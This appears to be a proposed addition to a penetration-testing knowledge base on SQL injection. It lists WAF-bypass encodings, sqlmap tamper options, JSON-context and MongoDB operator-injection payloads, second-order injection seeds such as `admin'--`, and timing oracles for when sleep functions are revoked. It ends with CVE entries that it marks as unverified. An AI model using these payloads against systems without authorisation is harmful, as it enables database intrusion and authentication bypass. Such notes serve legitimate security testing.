# PROPOSAL (proposal) for docs/knowledge/class-sqli.md — kb-enrich 2026-07-17
_Review and apply manually; not auto-merged into the KB._

## New sections (kb-enrich, 2026-07-17)

### WAF-bypass encodings (payload level)
- Inline comment splitting: `SELECT/**/password/**/FROM/**/users` (defeats `\s+`-anchored regex WAFs)
- Parenthesis-as-delimiter: `SELECT(password)FROM(users)`
- URL-encoded newline: `SELECT%0apassword%0aFROM%0ausers`
- Case randomization (`uNiOn SeLeCt`) + double URL-encoding (`%2555NION`)
- sqlmap starting combo: `--tamper=space2comment,randomcase` (50+ tampers exist; pick per-WAF — Cloudflare/AWS WAF/ModSecurity each favor different ones)

### ORM escape-hatch injection (new finding class to watch for)
Every ORM has a raw-query escape hatch that reintroduces string-concat SQLi:
- Django `.raw(f"... WHERE username = '{username}'")`
- SQLAlchemy `db.execute(text(f"... WHERE name = '{name}'"))`
Signal: an endpoint whose error format/behavior differs from the rest of the app's parameterized ORM
calls suggests a raw-query path underneath — worth an extra `'` probe even if sibling endpoints are clean.

### Second-order / stored SQLi (currently unhandled by our confirm primitive)
Payload stored harmlessly at write time (e.g. `admin'--` as a registration username) fires later when
reused unparameterized in a DIFFERENT query (password reset, admin lookup, audit-log render). Our
single-request `'` vs `''` differential cannot catch this — requires manually tracing a stored text
field (username/display-name/address) across endpoints. Flag any text field that accepts SQL
metacharacters without rejection at write time as a manual second-order follow-up candidate.

### JSON-context bypass payloads (for JSON-body APIs, WAF-signature evasion)
- PostgreSQL JSON containment: `'/*/OR/*/'{"a":1}'::jsonb @> '{"a":1}'::jsonb--`
- MySQL JSON_EXTRACT: `'/*/OR/*/JSON_EXTRACT('{"a":1}','$.a')=1--`
Both avoid literal `OR 1=1`-shaped tokens that legacy WAF signatures match on.

### NoSQL/MongoDB operator injection (adjacent — relevant on JSON-API/Mongo-backed targets)
- Auth-bypass: `{"username":"admin","password":{"$ne":null}}`
- `$where` JS-eval: `'; return true; //` (closes literal inside `$where`, evaluated as JS → every doc
  matches); `sleep()` inside `$where` = time-based oracle equivalent to SQL `SLEEP()`.
- Detection signal: a JSON field normally taking a string/number behaves differently when sent as a
  nested object (`{"$gt":""}`) — sign the backend passes JSON straight into a query filter.

### Timing-oracle alternatives when SLEEP()/pg_sleep() is revoked
`generate_series(1,10000000)` (CPU burn), `repeat('a',1<<27)` (memory pressure), or a recursive CTE
counting to ~5e7 — measurable delay without the sleep grant, for hardened targets that lock down
sleep functions specifically to kill time-based blind SQLi.

### ⚠️ Unverified fresh CVEs (2026-07-17) — NVD/vendor-advisory verify before acting, LEAD-only
- CVE-2025-1094 — claimed libpq encoding-confusion (BIG5 client / EUC_TW server) defeating
  `PQescapeLiteral` quote neutralization; claimed patched PostgreSQL 13.19–17.3, Feb 2025.
- CVE-2026-42208 — claimed pre-auth SQLi in an LiteLLM-style AI-gateway. Independent of this specific
  ID's validity: AI-gateway/LLM-proxy infra is an emerging, likely under-tested SQLi surface class.
- CVE-2026-40906 — claimed injection in an ElectricSQL-style Postgres replication-sync API
  (`/v1/shape`). Independent of ID validity: replication/CDC/logical-sync HTTP APIs are a fresh,
  rarely-tested injection surface class worth remembering.

Sources: https://hivesecurity.gitlab.io/blog/sql-injection-complete-guide-2026/ ,
https://www.vulnsy.com/cheat-sheets/sql-injection ,
https://bugbounty.info/Attack-Surface/Web/Injection/SQLi/Second-Order ,
https://www.graphnodesoftware.com/blog/nosql-injection ,
https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94
